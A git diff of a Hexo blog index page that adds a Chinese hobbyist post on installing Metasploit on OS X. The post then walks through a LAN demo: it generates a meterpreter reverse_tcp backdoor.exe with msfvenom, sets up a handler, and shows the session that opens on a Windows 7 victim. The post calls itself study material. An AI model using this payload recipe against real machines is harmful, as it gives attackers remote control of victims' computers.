@@ -116,7 +116,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/tags/Blog/" style="font-size: 15px;">Blog</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jekyll/" style="font-size: 10px;">Jekyll</a> <a href="/tags/Landscape/" style="font-size: 10px;">Landscape</a> <a href="/tags/MFC/" style="font-size: 17.5px;">MFC</a> <a href="/tags/Metasploit/" style="font-size: 12.5px;">Metasploit</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/Pi/" style="font-size: 15px;">Pi</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Wi-Fi/" style="font-size: 15px;">Wi-Fi</a> <a href="/tags/review/" style="font-size: 10px;">review</a>
+						<a href="/tags/ARP/" style="font-size: 10px;">ARP</a> <a href="/tags/Blog/" style="font-size: 15px;">Blog</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/Jekyll/" style="font-size: 10px;">Jekyll</a> <a href="/tags/Landscape/" style="font-size: 10px;">Landscape</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/MFC/" style="font-size: 17.5px;">MFC</a> <a href="/tags/Metasploit/" style="font-size: 12.5px;">Metasploit</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/Pi/" style="font-size: 15px;">Pi</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Wi-Fi/" style="font-size: 15px;">Wi-Fi</a> <a href="/tags/review/" style="font-size: 10px;">review</a>
 					</div>
 				</section>
 				
@@ -191,6 +191,99 @@
 </nav>
 
       <div class="body-wrap">
+  
+    <article id="post-2015-11-08-msf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/11/08/2015-11-08-msf/" class="article-date">
+  	<time datetime="2015-11-08T03:40:25.000Z" itemprop="datePublished">2015-11-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/08/2015-11-08-msf/">Metasploit折腾小记</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>还是写在文前：怎么说呢，折腾这个东西我的内心是很复杂的。一个美好的用来写模电和概率和大物的周日就这么没了ˊ_&gt;ˋ哎呀，可是人家就是这么执着的跳坑怎么破。还是和以往一样，这篇文章的相关技术仅供学习，千万不要做出一些危险出格的事情。</li>
+</ul>
+<h3 id="Metasploit_u7684_u5B89_u88C5"><a href="#Metasploit_u7684_u5B89_u88C5" class="headerlink" title="Metasploit的安装"></a>Metasploit的安装</h3><p>这一部分真的是让我的心都碎了，也是最难折腾的。在YouTube上面找了好多视频，永远都是人家一路回车，我一路报错，果然是人品用完的节奏。闲话少说，开始安装，我的系统是Mac OS X 10.10.5，一般大家都是用BT5干这种活啦。</p>
+<ol>
+<li>从Github上克隆Metasploit项目<br>选一个合适的目录，然后在终端里面输入:  </li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:rapid7/metasploit-framework.git</span><br></pre></td></tr></table></figure>
+<p>之后把终端cd到你刚才选择的目录，输入:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></p>
+<p>报错就对了，因为你没有装蛋疼的依赖环境。</p>
+<ol>
+<li>安装依赖环境<br>2.1 <em>Ruby</em><br>因为我是Mac系统又安装了Xcode，所以已经有了Ruby 1.8的环境，但是后续安装会要求更高的版本，所以我们先更新一下Ruby，推荐使用rvm，具体参见<a href="http://www.inferjay.com/blog/2013/05/09/how-to-install-ruby-1-dot-9-3-in-mac-osx/" target="_blank" rel="external">脉脉不得语的技术博客</a><br>2.2 <em>Homebrew</em><br>这玩意是个OS X的软件管理器，相当好用，我们使用Ruby命令来安装它，下面的安装会用到。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>我们作死运行下Metasploit，发现还是报错，具体报什么错我也忘记了（哭）。<br>2.3 <em>Nmap</em><br>强大的嗅探器，使用我们刚刚装好的homebrew安装：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">brew install nmap</span><br><span class="line">```    </span><br><span class="line"><span class="number">2.4</span> *bundler*  </span><br><span class="line">就是这货坑死人不偿命，按照教程来说，只需要简单的一句指令：</span><br><span class="line">```c</span><br><span class="line">gem install bundler</span><br></pre></td></tr></table></figure></p>
+<p>我猜你们一定会在安装到nokogiri的时候报错，事实就是这玩意需要自己手动安装，报错提示libiconv is missing，解决方案：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew update</span><br><span class="line">xcode-select --install</span><br><span class="line">brew link libiconv--force</span><br><span class="line">gem install nokogiri -- --with-iconv-dir=/usr/local/Cellar/libiconv/<span class="number">1.14</span></span><br></pre></td></tr></table></figure></p>
+<p>再次使用gem install bundler</p>
+<ol>
+<li>安装postgresql并配置。<br>这个我不会-_-#，因为我发现不配置数据库的话Metasploit已经可以使用了，不用数据库的视频教程见<a href="https://www.youtube.com/watch?v=C2CEQupM2PM" target="_blank" rel="external">YouTube</a>.我基本上是按照他的顺序安装的。<br>关于配置数据库的教程：<a href="http://www.freebuf.com/articles/system/36924.html" target="_blank" rel="external">RickGrey</a>(中文教程)、<a href="http://www.darkoperator.com/installing-metasploit-framewor/" target="_blank" rel="external">Darkoperator</a>(英文教程)。<br>其他的相关问题可以在官方的论坛<a href="https://community.rapid7.com/community/metasploit" target="_blank" rel="external">RAPID7COMMUNITY</a>上交流。   </li>
+</ol>
+<h3 id="u4E00_u6B21_u7B80_u5355_u7684_u5185_u7F51_u6E17_u900F"><a href="#u4E00_u6B21_u7B80_u5355_u7684_u5185_u7F51_u6E17_u900F" class="headerlink" title="一次简单的内网渗透"></a>一次简单的内网渗透</h3><ul>
+<li>工具：Mac OS X with Metasploit(Attacker)  Windows 7(Victim)</li>
+<li>原理：通过msfpayload生成后门exe然后上传到目标机器上执行，通过本地监听获得meterpreter shell，并得到shell<h4 id="u751F_u6210_u4E00_u4E2Abackdoor-exe"><a href="#u751F_u6210_u4E00_u4E2Abackdoor-exe" class="headerlink" title="生成一个backdoor.exe"></a>生成一个backdoor.exe</h4>Windows:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./msfvenom windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; backdoor.exe</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>几点说明：如果被攻击的计算机和你在同一局域网下，可以使用LAN IP，用ifconfig即可，如果是WAN攻击则使用WAN IP即可。<br>如果运行sudo ./msfvenom终端提示你安装bundler，自求多福吧，我也不知道怎么解决的。耗了一下午反复装了无数遍最后居然莫名其妙的好了。<br>这里使用的msfvenom是因为软件更新，原先的msfpayload功能已经集成在了msfvenom里了。</p>
+<h4 id="u4E0A_u4F20backdoor-exe_u5E76_u83B7_u5F97shell"><a href="#u4E0A_u4F20backdoor-exe_u5E76_u83B7_u5F97shell" class="headerlink" title="上传backdoor.exe并获得shell"></a>上传backdoor.exe并获得shell</h4><p>直接上指令：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.3</span><br><span class="line">LHOST =&gt; 192.168.1.3</span><br><span class="line">msf exploit(handler) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure></p>
+<p>在Victim的计算机上双击backdoor.exe，顺利的话会这样：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse handler on 192.168.1.3:4444</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (957486 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.3:4444 -&gt; 192.168.1.3:54411) at 2015-11-08 22:07:07 +0800</span><br></pre></td></tr></table></figure></p>
+<p>然后输入shell尽情玩耍吧……<br>附上一张截图：<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1exupqph2nvj313w0bxack.jpg" alt=""><br>由图可见我完全接管了Windows 7的shell，下面就可以随心所欲了23333</p>
+<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>对于linux来说，遇到错误真的就是Google，复制命令然后祈祷了。装什么东西都要搞一大堆依赖包，不过总体来说还是比较人性化，大多数时候终端会告诉你你需要装什么。Metasploit功能强大，最近在测试的只是基于LAN下的计算机，更深入的问题留作以后探讨。<br>最后用BackTrack Linux上的一句话来作结：</p>
+<blockquote>
+<p>The quieter you become,the more you are able to hear…</p>
+</blockquote>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/">Metasploit</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-2015-10-23-cppcode4" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -998,67 +1091,6 @@
 
 
   
-    <article id="post-2015-10-04-Mac" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2015/10/04/2015-10-04-Mac/" class="article-date">
-  	<time datetime="2015-10-04T10:34:38.000Z" itemprop="datePublished">2015-10-04</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/04/2015-10-04-Mac/">重新认识Mac</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>先附上几张照片吧</p><br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1ewpa4y4ivcj31400p012q.jpg"><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1ewpa4xlolpj31400p00vk.jpg"><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1ewpa4ypqupj31400p044g.jpg"><br><img src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ewpa4z7lckj30fk03vmxh.jpg"><br><p><br>这个就是传说中的Mac OS X User Edition啦，貌似Apple的新出的系统也没有这么炫酷吧+_+，今天瞎捣鼓了一下，也重新认识了下强大的OS X系统。<br><br>改变的主要有以下几点：<br><br><li>使用<a href="https://www.iterm2.com" target="_blank" rel="external">iterm2</a>和个性化配置<a href="https://github.com/robbyrussell/oh-my-zsh/tree/master/themes/" target="_blank" rel="external">oh-my-zsh。</a></li><br><li>使用<a href="https://github.com/SamRothCA/Today-Scripts/releases" target="_blank" rel="external">Today-Scripts</a>，这是一款能在通知栏运行脚本程序的软件。</li><br><li>使用<a href="https://www.alfredapp.com" target="_blank" rel="external">Alfred</a>来替换系统自带的spotlight。</li><br>iTerm 2 相比自带的 Terminal 应用，有太多优点了。例如，可以设置主题，支持画面分割，各种使用的快捷键，以及快速唤出。配合 Oh My Zsh 使用，效果相当之炫酷。<br><br>当然你首先得安装Zsh和iTerm2。至于怎么安装，直接上官网或者去Github上面clone一下人家的项目就好。<br><br>在<a href="https://github.com/robbyrussell/oh-my-zsh/tree/master/themes/" target="_blank" rel="external">Themes</a>上面下载主题。安装好以后用vim打开.zshrc文件，在配置文件中将<br><code>ZSH_THEME=&quot;robbyrussell&quot;</code>改为：<br><code>ZSH_THEME=&quot;你想改的主题&quot;</code><br>然后打开你的终端看看效果吧。<br><br></p><br><p><br>我还使用了一个新的wight小程序，名字是Today－Scripts。它可以在通知栏运行程序脚本。安装完可以自己添加代码。官方的<a href"https:="" github.com="" samrothca="" today-scripts="" wiki#"="">wiki</a>给出了很多脚本,可以根据需要自己添加，当然你也可以自己写一些脚本来做一些更加Geek的事情。</p><br><p><br>最后强烈推荐一个小程序，名为Alfred，简直黑科技。用快捷键快速调用基本可以完全告别dock和鼠标，然而我并没有购买完整版，完整版甚至可以在搜索框中执行终端的指令，售价17.99欧元。<br></p><br><p><br>ps 我还是抽时间去弄一下markdown吧，Mou已经装好，HTML排版是在是不忍吐槽了。<br></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OS-X/">OS X</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/操作系统/">操作系统</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
@@ -1069,7 +1101,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2015 年糕
+    		&copy; 2016 年糕
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
